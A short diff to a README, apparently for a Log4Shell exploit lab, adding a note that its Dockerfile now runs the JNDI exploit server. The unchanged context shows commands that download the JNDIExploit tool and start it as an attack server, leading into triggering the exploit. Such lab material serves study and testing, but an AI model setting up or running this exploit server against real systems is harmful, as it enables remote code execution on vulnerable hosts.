@@ -34,6 +34,7 @@ wget https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploi
 unzip JNDIExploit.v1.2.zip
 java -jar JNDIExploit-1.2-SNAPSHOT.jar -i your-private-ip -p 8888
 ```
+**Update (Dec 13th)**: *The above section from the original repository doesn't work because the docker image doesn't have the "wget" nor unzip command. This repository included all the files neccessary to run the JDNI server. The new Dockerfile includes the commands to copy the code into the container and run the JNDI server. The above section can be ignored.
 
 * Then, trigger the exploit using:
 
